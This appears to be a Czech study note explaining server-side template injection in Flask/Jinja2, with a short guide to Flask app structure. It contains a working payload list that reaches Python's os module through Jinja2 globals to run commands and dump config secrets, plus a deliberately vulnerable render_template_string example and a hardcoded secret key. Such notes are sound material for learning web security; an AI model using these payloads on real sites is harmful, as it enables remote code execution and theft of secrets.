## Jak fungují šablony

Šablona je HTML soubor s placeholdery:

```html
<p>Hello, {{ username }}!</p>
```
Flask vezme proměnnou `username` a dosadí ji:
```python
render_template('index.html', username='admin')
# výsledek: <p>Hello, admin!</p>
```
## Kde vzniká zranitelnost

Zranitelný kód dosadí vstup uživatele **přímo do šablony** před renderováním:

```python
# BEZPEČNÉ – username je proměnná, Jinja2 ho escapuje
render_template('index.html', username=username)

# ZRANITELNÉ – vstup je součástí šablony samotné
template = f"Hello, {username}!"          # f-string
render_template_string(template)           # Jinja2 vyhodnotí vše v {{ }}
```

Pokud zadáš `{{7*7}}` jako username, Jinja2 to vyhodnotí jako kód a vrátí `49`.

## Postup útoku
```
1. Test: zadej {{7*7}}
   → vrátí 49? = SSTI zranitelnost existuje

2. Zjisti kontext: co je dostupné?
   → {{config}}  – Flask konfigurace
   → {{request}} – HTTP request objekt

3. Dostaň se k os modulu přes __globals__
   → viz payload níže

4. Spusť příkaz
```
## Payload – proč ta syntaxe

Python je introspektivní – každý objekt ví o sobě vše přes speciální atributy:
```python
config                              # Flask Config objekt
config.__class__                    # jeho třída: <class 'flask.Config'>
config.__class__.__init__           # konstruktor třídy = funkce
config.__class__.__init__.__globals__ # globální proměnné ve scope té funkce
                                    # Flask tam importuje 'os', takže:
config.__class__.__init__.__globals__['os']  # dostaneme os modul
.popen('whoami').read()             # spustíme příkaz
```

## Payload

```python
# Test
{{7*7}}

# Zobraz konfiguraci (SECRET_KEY atd.)
{{config}}

# Spusť příkaz (Windows)
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
{{config.__class__.__init__.__globals__['os'].popen('dir').read()}}
{{config.__class__.__init__.__globals__['os'].popen('type app.py').read()}}

# Spusť příkaz (Linux)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat app.py').read()}}
```
## Proč to prochází sandboxem

Jinja2 blokuje přímý `import`, ale ne přístup k atributům objektů. Payload neimportuje `os` – **najde ho** v globálních proměnných funkce která ho již dříve importovala.

---

# Flask – struktura aplikace

## Minimální Flask aplikace
```python
from flask import Flask, render_template, request, redirect, session

app = Flask(__name__)
app.secret_key = 'tajnyKlic'        # nutné pro sessions

@app.route('/')                      # decorator – namapuj URL na funkci
def index():
    return 'Hello World'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']   # data z POST formuláře
        return redirect('/')
    return render_template('login.html')      # zobraz šablonu

if __name__ == '__main__':
    app.run(debug=True)
```

## Typická struktura projektu
```
projekt/
├── app.py                  # hlavní soubor aplikace
├── requirements.txt        # seznam závislostí (pip install -r)
├── config.py               # konfigurace (SECRET_KEY, DB atd.)
├── templates/              # HTML šablony (Jinja2)
│   ├── base.html           # základní šablona
│   ├── index.html
│   └── login.html
├── static/                 # statické soubory
│   ├── style.css
│   └── script.js
└── database.db             # SQLite databáze (pokud se používá)
```